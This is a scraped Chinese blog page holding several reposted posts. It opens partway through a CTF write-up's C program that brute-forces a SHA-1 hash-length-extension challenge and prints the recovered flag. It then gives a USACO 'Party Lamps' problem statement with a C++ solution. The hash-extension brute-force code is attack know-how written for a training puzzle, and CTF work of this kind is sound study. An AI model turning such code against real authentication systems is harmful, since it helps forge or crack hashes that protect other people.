                                                                          memcpy(&amp;amp;sss[<span class="number">2</span>],&amp;amp;argv[<span class="number">1</span>][<span class="number">0</span>],<span class="number">8</span>);
                                                                           unsigned   long h1 = strtoul(sss,&amp;amp;tostr,<span class="number">16</span>);
                                                                           memcpy(&amp;amp;sss[<span class="number">2</span>],&amp;amp;argv[<span class="number">1</span>][<span class="number">8</span>],<span class="number">8</span>);
                                                                           unsigned   long h2 = strtoul(sss,&amp;amp;tostr,<span class="number">16</span>);
                                                                           memcpy(&amp;amp;sss[<span class="number">2</span>],&amp;amp;argv[<span class="number">1</span>][<span class="number">16</span>],<span class="number">8</span>);
                                                                           unsigned   long h3 = strtoul(sss,&amp;amp;tostr,<span class="number">16</span>);
                                                                           memcpy(&amp;amp;sss[<span class="number">2</span>],&amp;amp;argv[<span class="number">1</span>][<span class="number">24</span>],<span class="number">8</span>);
                                                                           unsigned   long h4 = strtoul(sss,&amp;amp;tostr,<span class="number">16</span>);
                                                                           memcpy(&amp;amp;sss[<span class="number">2</span>],&amp;amp;argv[<span class="number">1</span>][<span class="number">32</span>],<span class="number">8</span>);
                                                                           unsigned   long h5 = strtoul(sss,&amp;amp;tostr,<span class="number">16</span>);

                                                                           sha1.<span class="class">SHA1Reset</span>(&amp;amp;sh1context,h1,h2,h3,h4,h5);
                                                                          sha1.<span class="class">SHA1Input</span>(&amp;amp;sh1context,(<span class="class">BYTE</span>*)&amp;quot;attack&amp;quot;,<span class="number">128</span>);
                                                                           <span class="class">BYTE</span>   hashresult[<span class="number">20</span>];
                                                                           sha1.<span class="class">SHA1Result</span>(&amp;amp;sh1context,hashresult);
                                                                           char   stemp[<span class="number">10</span>];
                                                                           char   output[<span class="number">100</span>];
                                                                           output[<span class="number">0</span>]   = <span class="number">0</span>;
                                                                           for(int   i=<span class="number">0</span>;i&amp;lt;<span class="number">20</span>;i++)
                                                                           {
                                                                                    sprintf(stemp,&amp;quot;%<span class="number">02</span>x&amp;quot;,hashresult[i]);
                                                                                    strcat(output,stemp);
                                                                           }
                                                                           for(i=<span class="number">0</span>;i&amp;lt;<span class="number">7</span>;i++)
                                                                                    output[b1[i]]  = &amp;apos;x&amp;apos;;
                                                                           if(strcmp(argv[<span class="number">2</span>],output)   == <span class="number">0</span>)
                                                                           {
                                                                                    printf(&amp;quot;find!   \n%s\n&amp;quot;,argv[<span class="number">1</span>]);
                                                                                    return   <span class="number">0</span>;
                                                                           }
                                                                 }
                                                        }
                                               }
                                     }
                            }
                   }
         }


         return   <span class="number">0</span>;
}
</code></pre><h4 id="&#x6700;&#x540E;&#x83B7;&#x53D6;&#x7684;flag&#x4E3A;Congratulations,_flag_is_flag{ha5h_ex7ens1on_r0cks!}">&#x6700;&#x540E;&#x83B7;&#x53D6;&#x7684;flag&#x4E3A;Congratulations, flag is flag{ha5h_ex7ens1on_r0cks!}</h4><h4 id="*&#x4F5C;&#x8005;&#xFF1A;&#x58A8;&#x5BA2;&#xFF0C;&#x672C;&#x6587;&#x5C5E;FreeBuf&#x539F;&#x521B;&#x5956;&#x52B1;&#x8BA1;&#x5212;&#xFF0C;&#x672A;&#x7ECF;&#x8BB8;&#x53EF;&#x7981;&#x6B62;&#x8F6C;&#x8F7D;">*&#x4F5C;&#x8005;&#xFF1A;&#x58A8;&#x5BA2;&#xFF0C;&#x672C;&#x6587;&#x5C5E;FreeBuf&#x539F;&#x521B;&#x5956;&#x52B1;&#x8BA1;&#x5212;&#xFF0C;&#x672A;&#x7ECF;&#x8BB8;&#x53EF;&#x7981;&#x6B62;&#x8F6C;&#x8F7D;</h4><p>&#x8D5E;&#x4E00;&#x4E2A; &#x6536; &#x85CF; </p>
<p> &#x63A8;&#x8350;&#x6587;&#x7AE0;</p>
<ul>
<li>1.<a href="/articles/3UfaIzA">&#x5224;&#x65AD;&#x6B27;&#x62C9;&#x56DE;&#x8DEF;</a></li>
<li>2.<a href="/articles/qqAFRzM">&#x300A;&#x7B97;&#x6CD5;&#x5BFC;&#x8BBA;&#x300B;&#x8BFB;&#x4E66;&#x7B14;&#x8BB0;&#x4E4B;&#x6392;&#x5E8F;&#x7B97;&#x6CD5;&#x2014;Merge Sort &#x5F52;&#x5E76;&#x6392;&#x5E8F;&#x7B97;&#x6CD5;</a></li>
<li>3.<a href="/articles/BnYNRjI">PAT Gas Station</a></li>
<li>4.<a href="/articles/yY7RF3">USACO 2.2 Party Lamps &#x6D3E;&#x5BF9;&#x706F; (lamps)</a></li>
<li>5.<a href="/articles/vuuUFjY">&#x51E0;&#x79CD;&#x9501;&#x7B97;&#x6CD5;&#x7684;&#x5B9E;&#x73B0;</a></li>
<li><p>6.<a href="/articles/NrMJJz">CUDA —— Dynamic Parallelism</a></p>
<p>&#x76F8;&#x5173;&#x5FAE;&#x535A; <a href="/articles/weibo_list/BRrEJv">()</a></p>
</li>
</ul>
<h5 id="&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;">&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;</h5><p>&#x9519;&#x8BEF; </p>
<p> &#x767B;&#x5F55;&#x540E;&#x8BC4;&#x8BBA; &#x5DF2;&#x53D1;&#x8868;&#x8BC4;&#x8BBA;&#x6570;( ) </p>
<p>&#x6CA1;&#x6709;&#x66F4;&#x591A;&#x8BC4;&#x8BBA;&#x4E86;^^ </p>
<p>&#x66F4;&#x591A;&#x8BC4;&#x8BBA;</p>
<p>&#x8BC4;&#x8BBA;&#x52A0;&#x8F7D;&#x5931;&#x8D25;&#xFF0C;<a href="javascript:reload_comments(&apos;BRrEJv&apos;,1,0,-1);" target="_blank" rel="external">&#x91CD;&#x65B0;&#x52A0;&#x8F7D;</a></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/transcribe/">transcribe</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/加密解密/">加密解密</a><a href="/tags/网络安全/">网络安全</a>
  </div>

</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2015/06/07/2fab6f3/" title="USACO 2.2 Party Lamps 派对灯 (lamps) -" itemprop="url">USACO 2.2 Party Lamps 派对灯 (lamps) -</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="edwin" target="_blank" itemprop="author">edwin</a>
		
  <p class="article-time">
    <time datetime="2015-06-06T23:06:03.000Z" itemprop="datePublished"> 发表于 2015-06-07</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h1 id="USACO_2-2_Party_Lamps_&#x6D3E;&#x5BF9;&#x706F;_(lamps)">USACO 2.2 Party Lamps &#x6D3E;&#x5BF9;&#x706F; (lamps)</h1><p> &#x65F6;&#x95F4;&#xA0;2015-06-07 11:37:00  <a href="/sites/Fn2umm">&#x535A;&#x5BA2;&#x56ED;-&#x539F;&#x521B;&#x7CBE;&#x534E;&#x533A;</a></p>
<p><em>&#x539F;&#x6587;</em>&#xA0; <a href="http://www.cnblogs.com/luowenqing/p/4558178.html?utm_source=tuicool" target="_blank" rel="external">http://www.cnblogs.com/luowenqing/p/4558178.html</a></p>
<p> &#x4E3B;&#x9898; <a href="/topics/11000060">&#x6280;&#x672F;</a></p>
<h3 id="&#x9898;&#x76EE;&#x63CF;&#x8FF0;">&#x9898;&#x76EE;&#x63CF;&#x8FF0;</h3><p>&#x5728;IOI98&#x7684;&#x8282;&#x65E5;&#x5BB4;&#x4F1A;&#x4E0A;&#xFF0C;&#x6211;&#x4EEC;&#x6709;N(10&lt;=N&lt;=100)&#x76CF;&#x5F69;&#x8272;&#x706F;&#xFF0C;&#x4ED6;&#x4EEC;&#x5206;&#x522B;&#x4ECE;1&#x5230;N&#x88AB;&#x6807;&#x4E0A;&#x53F7;&#x7801;&#x3002;<br>&#x8FD9;&#x4E9B;&#x706F;&#x90FD;&#x8FDE;&#x63A5;&#x5230;&#x56DB;&#x4E2A;&#x6309;&#x94AE;&#xFF1A; </p>
<ul>
<li>&#x6309;&#x94AE;1&#xFF1A;&#x5F53;&#x6309;&#x4E0B;&#x6B64;&#x6309;&#x94AE;&#xFF0C;&#x5C06;&#x6539;&#x53D8;&#x6240;&#x6709;&#x7684;&#x706F;&#xFF1A;&#x672C;&#x6765;&#x4EAE;&#x7740;&#x7684;&#x706F;&#x5C31;&#x7184;&#x706D;&#xFF0C;&#x672C;&#x6765;&#x662F;&#x5173;&#x7740;&#x7684;&#x706F;&#x88AB;&#x70B9;&#x4EAE;&#x3002;</li>
<li>&#x6309;&#x94AE;2&#xFF1A;&#x5F53;&#x6309;&#x4E0B;&#x6B64;&#x6309;&#x94AE;&#xFF0C;&#x5C06;&#x6539;&#x53D8;&#x6240;&#x6709;&#x5947;&#x6570;&#x53F7;&#x7684;&#x706F;&#x3002;</li>
<li>&#x6309;&#x94AE;3&#xFF1A;&#x5F53;&#x6309;&#x4E0B;&#x6B64;&#x6309;&#x94AE;&#xFF0C;&#x5C06;&#x6539;&#x53D8;&#x6240;&#x6709;&#x5076;&#x6570;&#x53F7;&#x7684;&#x706F;&#x3002;</li>
<li>&#x6309;&#x94AE;4&#xFF1A;&#x5F53;&#x6309;&#x4E0B;&#x6B64;&#x6309;&#x94AE;&#xFF0C;&#x5C06;&#x6539;&#x53D8;&#x6240;&#x6709;&#x5E8F;&#x53F7;&#x662F;3*K+1(K&gt;=0)&#x7684;&#x706F;&#x3002;&#x4F8B;&#x5982;&#xFF1A;1,4,7…</li>
</ul>
<p>&#x4E00;&#x4E2A;&#x8BA1;&#x6570;&#x5668;C&#x8BB0;&#x5F55;&#x6309;&#x94AE;&#x88AB;&#x6309;&#x4E0B;&#x7684;&#x6B21;&#x6570;&#x3002;<br>&#x5F53;&#x5BB4;&#x4F1A;&#x5F00;&#x59CB;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x706F;&#x90FD;&#x4EAE;&#x7740;&#xFF0C;&#x6B64;&#x65F6;&#x8BA1;&#x6570;&#x5668;C&#x4E3A;0&#x3002;<br>&#x4F60;&#x5C06;&#x5F97;&#x5230;&#x8BA1;&#x6570;&#x5668;C(0&lt;=C&lt;=10000)&#x4E0A;&#x7684;&#x6570;&#x503C;&#x548C;&#x7ECF;&#x8FC7;&#x82E5;&#x5E72;&#x64CD;&#x4F5C;&#x540E;&#x6240;&#x6709;&#x706F;&#x7684;&#x72B6;&#x6001;&#x3002;&#x5199;&#x4E00;&#x4E2A;&#x7A0B;&#x5E8F;&#x53BB;&#x627E;&#x51FA;&#x6240;&#x6709;&#x706F;&#x6700;&#x540E;&#x53EF;&#x80FD;&#x7684;&#x4E0E;&#x6240;&#x7ED9;&#x51FA;&#x4FE1;&#x606F;&#x76F8;&#x7B26;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x5E76;&#x4E14;&#x6CA1;&#x6709;&#x91CD;&#x590D;&#x3002; </p>
<h3 id="&#x8F93;&#x5165;">&#x8F93;&#x5165;</h3><h3 id="&#x4E0D;&#x4F1A;&#x6709;&#x706F;&#x4F1A;&#x5728;&#x8F93;&#x5165;&#x4E2D;&#x51FA;&#x73B0;&#x4E24;&#x6B21;&#x3002;_&#x7B2C;&#x4E00;&#x884C;:_N&#x3002;_&#x7B2C;&#x4E8C;&#x884C;:_C&#x6700;&#x540E;&#x663E;&#x793A;&#x7684;&#x6570;&#x503C;&#x3002;_&#x7B2C;&#x4E09;&#x884C;:_&#x6700;&#x540E;&#x4EAE;&#x7740;&#x7684;&#x706F;,&#x7528;&#x4E00;&#x4E2A;&#x7A7A;&#x683C;&#x5206;&#x5F00;&#xFF0C;&#x4EE5;-1&#x4E3A;&#x7ED3;&#x675F;&#x3002;_&#x7B2C;&#x56DB;&#x884C;:_&#x6700;&#x540E;&#x5173;&#x7740;&#x7684;&#x706F;,&#x7528;&#x4E00;&#x4E2A;&#x7A7A;&#x683C;&#x5206;&#x5F00;&#xFF0C;&#x4EE5;-1&#x4E3A;&#x7ED3;&#x675F;&#x3002;">&#x4E0D;&#x4F1A;&#x6709;&#x706F;&#x4F1A;&#x5728;&#x8F93;&#x5165;&#x4E2D;&#x51FA;&#x73B0;&#x4E24;&#x6B21;&#x3002; <table><tbody><tr><td> &#x7B2C;&#x4E00;&#x884C;: </td><td> N&#x3002; </td></tr><tr><td> &#x7B2C;&#x4E8C;&#x884C;: </td><td> C&#x6700;&#x540E;&#x663E;&#x793A;&#x7684;&#x6570;&#x503C;&#x3002; </td></tr><tr><td> &#x7B2C;&#x4E09;&#x884C;: </td><td> &#x6700;&#x540E;&#x4EAE;&#x7740;&#x7684;&#x706F;,&#x7528;&#x4E00;&#x4E2A;&#x7A7A;&#x683C;&#x5206;&#x5F00;&#xFF0C;&#x4EE5;-1&#x4E3A;&#x7ED3;&#x675F;&#x3002; </td></tr><tr><td> &#x7B2C;&#x56DB;&#x884C;: </td><td> &#x6700;&#x540E;&#x5173;&#x7740;&#x7684;&#x706F;,&#x7528;&#x4E00;&#x4E2A;&#x7A7A;&#x683C;&#x5206;&#x5F00;&#xFF0C;&#x4EE5;-1&#x4E3A;&#x7ED3;&#x675F;&#x3002; </td></tr></tbody></table></h3><h3 id="&#x8F93;&#x51FA;">&#x8F93;&#x51FA;</h3><p>&#x6BCF;&#x4E00;&#x884C;&#x662F;&#x6240;&#x6709;&#x706F;&#x53EF;&#x80FD;&#x7684;&#x6700;&#x540E;&#x72B6;&#x6001;(&#x6CA1;&#x6709;&#x91CD;&#x590D;)&#x3002;&#x6BCF;&#x4E00;&#x884C;&#x6709;N&#x4E2A;&#x5B57;&#x7B26;&#xFF0C;&#x7B2C;1&#x4E2A;&#x5B57;&#x7B26;&#x8868;&#x793A;1&#x53F7;&#x706F;&#xFF0C;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x8868;&#x793A;N&#x53F7;&#x706F;&#x3002;0&#x8868;&#x793A;&#x5173;&#x95ED;&#xFF0C;1&#x8868;&#x793A;&#x4EAE;&#x7740;&#x3002;&#x8FD9;&#x4E9B;&#x884C;&#x5FC5;&#x987B;&#x4ECE;&#x5C0F;&#x5230;&#x5927;&#x6392;&#x5217;&#xFF08;&#x770B;&#x4F5C;&#x662F;&#x4E8C;&#x8FDB;&#x5236;&#x6570;&#xFF09;&#x3002;<br>&#x5982;&#x679C;&#x6CA1;&#x6709;&#x53EF;&#x80FD;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x5219;&#x8F93;&#x51FA;&#x4E00;&#x884C;&apos;IMPOSSIBLE&apos;&#x3002; </p>
<h3 id="&#x8F93;&#x5165;&#x8F93;&#x51FA;&#x6837;&#x4F8B;">&#x8F93;&#x5165;&#x8F93;&#x51FA;&#x6837;&#x4F8B;</h3><p> Copy</p>
<pre><code>10
1
-<span class="ruby"><span class="number">1</span>
</span>7 -1
</code></pre><p> Copy</p>
<pre><code><span class="number">0000000000</span>
<span class="number">0101010101</span>
<span class="number">0110110110</span>
</code></pre><h3 id="&#x63D0;&#x793A;">&#x63D0;&#x793A;</h3><p>&#x5728;&#x8FD9;&#x4E2A;&#x6837;&#x4F8B;&#x4E2D;&#xFF0C;&#x6709;10&#x76CF;&#x706F;&#xFF0C;&#x53EA;&#x6709;1&#x4E2A;&#x6309;&#x94AE;&#x88AB;&#x6309;&#x4E0B;&#x3002;&#x6700;&#x540E;7&#x53F7;&#x706F;&#x662F;&#x5173;&#x7740;&#x7684;&#x3002;</p>
<p>&#x5728;&#x8FD9;&#x4E2A;&#x6837;&#x4F8B;&#x4E2D;&#xFF0C;&#x6709;&#x4E09;&#x79CD;&#x53EF;&#x80FD;&#x7684;&#x72B6;&#x6001;&#xFF1A;</p>
<ul>
<li><p>&#x6240;&#x6709;&#x706F;&#x90FD;&#x5173;&#x7740;</p>
</li>
<li><p>1,4,7,10&#x53F7;&#x706F;&#x5173;&#x7740;&#xFF0C;2,3,5,6,8,9&#x4EAE;&#x7740;&#x3002;</p>
</li>
<li><p>1,3,5,7,9&#x53F7;&#x706F;&#x5173;&#x7740;&#xFF0C;2, 4, 6, 8, 10&#x4EAE;&#x7740;&#x3002;&#xA0;</p>
<p>&#x5F00;&#x59CB;&#x505A;&#x7684;&#x65F6;&#x5019;&#x5F88;&#x6CA1;&#x601D;&#x8DEF; &#x51E0;&#x6B32;&#x60F3;&#x6253;dfs &#xA0;&#x7136;&#x540E;&#x770B;NOCOW(&quot;&#x53C8;&quot;&#x662F;Nocow) &#x7136;&#x540E;&#x53D1;&#x73B0;&#x4E86;&#x4E00;&#x4E2A;&#x5E38;&#x6570;&#x8868;&#x7684;&#x6253;&#x53D1; &#xA0;&#x6211;&#x76F8;&#x4FE1;&#x4ED6;&#x8BB2;&#x7684;&#x80AF;&#x5B9A;&#x8981;&#x6BD4;&#x6211;&#x8BB2;&#x5F97;&#x597D; &#xA0;&#x6240;&#x4EE5;&#x5148;&#x7ED9;&#x4E2A; <a href="http://www.nocow.cn/index.php/USACO/lamps#.E4.B8.80.E7.A7.8D.E8.B7.9F.E8.AF.B8.E4.BD.8D.E6.88.AA.E7.84.B6.E4.B8.8D.E5.90.8C.E7.9A.84.E6.96.B9.E6.B3.95.EF.BC.88.E4.BB.A3.E7.A0.81.E6.98.AF.E6.AF.94.E8.BE.83.E7.AE.80.E6.B4.81.E7.9A.84.EF.BC.89" target="_blank" rel="external">&#x94FE;&#x63A5;</a> &#xA0;&#xA0;&#xA0;&#xA0;&#x7136;&#x800C;&#x6211;&#x8FD8;&#x662F;&#x8BF4;&#x4E00;&#x4E0B;&#x6211;&#x7684;&#x7406;&#x89E3; &#xA0;&#x5176;&#x5B9E;&#x4ED4;&#x7EC6;&#x770B;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x662F;&#x6BCF;6&#x4E2A;&#x4E00;&#x5FAA;&#x73AF;&#x7684; &#xA0;&#x4E3A;&#x4EC0;&#x4E48;&#x5462; ? &#x5373;gcd(1,2,2,3)&#xA0;&#xA0;&#xA0;&#xA0;&#x5176;&#x6B21;&#x6309;2&#x6309;3=&#x6309;1 &#xA0;&#x6309;1&#x6309;2=&#x6309;3 &#x6309;1&#x6309;3=&#x6309;2 &#x6309;1&#x6309;2&#x6309;3=&#x4E0D;&#x6309;…….(&#x4EE5;&#x4E0B;&#x7701;&#x7565;)&#xA0;&#xA0;&#xA0;&#xA0;&#x8FD9;&#x4E4B;&#x540E;&#x628A;&#x6240;&#x6709;&#x7684;&#x60C5;&#x51B5;&#x7528;&#x4E00;&#x4E2A;&#x5E38;&#x6570;&#x8868;&#x4FDD;&#x5B58;&#x8D77;&#x6765; &#xA0;&#x6700;&#x540E;&#x904D;&#x5386;&#x4E00;&#x904D; &#x5BF9;&#x4ED6;&#x7ED9;&#x51FA;&#x786E;&#x5B9A;&#x7684;&#x6309;&#x6216;&#x4E0D;&#x6309;&#x7684;&#x706F;&#x518D;&#x5230;&#x8FD9;&#x4E2A;&#x5E38;&#x6570;&#x8868;&#x91CC;&#x770B;&#x662F;&#x5426;&#x543B;&#x5408; &#xA0;&#x7136;&#x540E;&#x5C31;&#x662F;&#x4E00;&#x4E9B;&#x8FB9;&#x754C;&#x7684;&#x8003;&#x8651;&#x4E86; &#xA0;&#x518D;&#x8005;&#x6211;&#x8FD9;&#x4E2A;&#x4EE3;&#x7801;&#x5728;usaco&#x91CC;&#x662F;&#x53EF;&#x4EE5;a&#x7684; &#xA0;&#x4F46;yzoi&#x603B;&#x662F;&#x6709;&#x4E00;&#x4E2A;&#x70B9;&#x8FC7;&#x4E0D;&#x53BB;(&#x4EC0;&#x4E48;&#x5751;&#x7239;&#x6570;&#x636E;……)</p>
</li>
</ul>
<p>&#x6709;&#x56FE;&#x4E3A;&#x8BC1;: </p>
<p><img src="http://taojinke.github.io/img/20150607/2fa68d3.jpg" alt=""></p>
<p>&#x4EE3;&#x7801;&#x5982;&#x4E0B;:</p>
<pre><code><span class="comment">/*
ID:laphets
PROG:lamps
LANG:C++
*/</span>
<span class="preprocessor">#include&amp;lt;iostream&amp;gt;</span>
<span class="preprocessor">#include&amp;lt;cstdio&amp;gt;</span>
<span class="preprocessor">#include&amp;lt;cstring&amp;gt;</span>
<span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;
<span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">10000</span>+<span class="number">10</span>;
<span class="keyword">int</span> n,c,x,tmp;
<span class="keyword">int</span> data[maxn];
<span class="keyword">int</span> cnt1,cnt2;
<span class="keyword">int</span> light[<span class="number">9</span>][<span class="number">7</span>]=
{
    <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,
    <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,  <span class="comment">//push 1</span>
    <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,  <span class="comment">//push 1 and 4</span>
    <span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,  <span class="comment">//push 3</span>
    <span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,  <span class="comment">//push 1 and 4</span>
    <span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,  <span class="comment">//push 4</span>
    <span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,  <span class="comment">//push 2</span>
    <span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,  <span class="comment">//push 2 and 4</span>
    <span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,  <span class="comment">//no push</span>
};
<span class="keyword">int</span> minmum[<span class="number">9</span>]={<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>};
<span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>
</span>{
<span class="comment">//  freopen(&amp;quot;1.sb&amp;quot;,&amp;quot;r&amp;quot;,stdin);</span>
    freopen(&amp;quot;lamps.in&amp;quot;,&amp;quot;r&amp;quot;,stdin);
    freopen(&amp;quot;lamps.out&amp;quot;,&amp;quot;w&amp;quot;,stdout); 
    <span class="built_in">cin</span>&amp;gt;&amp;gt;n&amp;gt;&amp;gt;c;
    <span class="built_in">memset</span>(data,-<span class="number">1</span>,<span class="keyword">sizeof</span>(data));
    <span class="keyword">while</span>(<span class="built_in">cin</span>&amp;gt;&amp;gt;x&amp;amp;&amp;amp;x!=-<span class="number">1</span>)
        data[x]=<span class="number">1</span>,cnt1++;
    <span class="keyword">while</span>(<span class="built_in">cin</span>&amp;gt;&amp;gt;x&amp;amp;&amp;amp;x!=-<span class="number">1</span>)
        data[x]=<span class="number">0</span>,cnt2++;
    <span class="keyword">if</span>(c==<span class="number">0</span>)
    {
           <span class="keyword">if</span>(cnt1==n)
        {
            <span class="keyword">while</span>(n--)
                <span class="built_in">cout</span>&amp;lt;&amp;lt;<span class="number">0</span>;
            <span class="built_in">cout</span>&amp;lt;&amp;lt;endl;
            <span class="keyword">return</span> <span class="number">0</span>;
        }     
        <span class="keyword">if</span>(cnt2==<span class="number">0</span>)
        {
            <span class="keyword">while</span>(n--)
                <span class="built_in">cout</span>&amp;lt;&amp;lt;<span class="number">1</span>;
            <span class="built_in">cout</span>&amp;lt;&amp;lt;endl;
            <span class="keyword">return</span> <span class="number">0</span>;
        }
        <span class="keyword">if</span>(cnt2!=<span class="number">0</span>)
        {
            <span class="built_in">cout</span>&amp;lt;&amp;lt;&amp;quot;IMPOSSIBLE&amp;quot;&amp;lt;&amp;lt;endl;  
            <span class="keyword">return</span> <span class="number">0</span>;
        }
    }
    <span class="keyword">if</span>(cnt1==n)
    {
        <span class="keyword">while</span>(n--)
            <span class="built_in">cout</span>&amp;lt;&amp;lt;<span class="number">0</span>;
        <span class="built_in">cout</span>&amp;lt;&amp;lt;endl;
        <span class="keyword">return</span> <span class="number">0</span>;
    }
    <span class="keyword">bool</span> flag1=<span class="keyword">false</span>;
    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&amp;lt;=<span class="number">8</span>;i++)
    {
        <span class="keyword">bool</span> flag2=<span class="keyword">true</span>;
        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&amp;lt;=n;j++)
        {
            <span class="keyword">if</span>(data[j]==-<span class="number">1</span>)
                <span class="keyword">continue</span>;
            tmp=j%<span class="number">6</span>;
            <span class="keyword">if</span>(tmp==<span class="number">0</span>)
                tmp=<span class="number">6</span>;
            <span class="keyword">if</span>(data[j]!=light[i][tmp])
            {
                flag2=<span class="keyword">false</span>;
                <span class="keyword">break</span>;
            }
        }
        <span class="keyword">if</span>(flag2==<span class="keyword">true</span>&amp;amp;&amp;amp;c&amp;gt;minmum[i])
        {
<span class="comment">//                  cout&amp;lt;&amp;lt;1&amp;lt;&amp;lt;endl;</span>
            flag1=<span class="keyword">true</span>;
            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&amp;lt;=n;j++)
            {
                tmp=j%<span class="number">6</span>;
                <span class="keyword">if</span>(tmp==<span class="number">0</span>)
                    tmp=<span class="number">6</span>;
                <span class="built_in">cout</span>&amp;lt;&amp;lt;light[i][tmp];
            }
            <span class="built_in">cout</span>&amp;lt;&amp;lt;endl;
        }
    }
    <span class="keyword">if</span>(flag1==<span class="keyword">false</span>)
        <span class="built_in">cout</span>&amp;lt;&amp;lt;&amp;quot;IMPOSSIBLE&amp;quot;&amp;lt;&amp;lt;endl;  
    <span class="keyword">return</span> <span class="number">0</span>;
}
</code></pre><p>&#x8D5E;&#x4E00;&#x4E2A; &#x6536; &#x85CF; </p>
<p> &#x63A8;&#x8350;&#x6587;&#x7AE0;</p>
<ul>
<li>1.<a href="/articles/3UfaIzA">&#x5224;&#x65AD;&#x6B27;&#x62C9;&#x56DE;&#x8DEF;</a></li>
<li>2.<a href="/articles/qqAFRzM">&#x300A;&#x7B97;&#x6CD5;&#x5BFC;&#x8BBA;&#x300B;&#x8BFB;&#x4E66;&#x7B14;&#x8BB0;&#x4E4B;&#x6392;&#x5E8F;&#x7B97;&#x6CD5;&#x2014;Merge Sort &#x5F52;&#x5E76;&#x6392;&#x5E8F;&#x7B97;&#x6CD5;</a></li>
<li>3.<a href="/articles/BnYNRjI">PAT Gas Station</a></li>
<li>4.<a href="/articles/BRrEJv">&#x201C;&#x5F3A;&#x7F51;&#x676F;&#x201D;&#x7F51;&#x7EDC;&#x5B89;&#x5168;&#x6311;&#x6218;&#x8D5B;WriteUp</a></li>
<li>5.<a href="/articles/vuuUFjY">&#x51E0;&#x79CD;&#x9501;&#x7B97;&#x6CD5;&#x7684;&#x5B9E;&#x73B0;</a></li>
<li><p>6.<a href="/articles/NrMJJz">CUDA —— Dynamic Parallelism</a></p>
<p>&#x76F8;&#x5173;&#x5FAE;&#x535A; <a href="/articles/weibo_list/yY7RF3">()</a></p>
</li>
</ul>
<h5 id="&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;">&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;</h5><p>&#x9519;&#x8BEF; </p>
<p> &#x767B;&#x5F55;&#x540E;&#x8BC4;&#x8BBA; &#x5DF2;&#x53D1;&#x8868;&#x8BC4;&#x8BBA;&#x6570;( ) </p>
<p>&#x6CA1;&#x6709;&#x66F4;&#x591A;&#x8BC4;&#x8BBA;&#x4E86;^^ </p>
<p>&#x66F4;&#x591A;&#x8BC4;&#x8BBA;</p>
<p>&#x8BC4;&#x8BBA;&#x52A0;&#x8F7D;&#x5931;&#x8D25;&#xFF0C;<a href="javascript:reload_comments(&apos;yY7RF3&apos;,1,0,-1);" target="_blank" rel="external">&#x91CD;&#x65B0;&#x52A0;&#x8F7D;</a></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/transcribe/">transcribe</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/技术/">技术</a>
  </div>

</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2015/06/07/2f0f082/" title=".spring jdbctemplate源码跟踪 -" itemprop="url">.spring jdbctemplate源码跟踪 -</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="edwin" target="_blank" itemprop="author">edwin</a>
		
  <p class="article-time">
    <time datetime="2015-06-06T23:06:01.000Z" itemprop="datePublished"> 发表于 2015-06-07</time>
    
  </p>
</header>
    <div class="article-content">
        
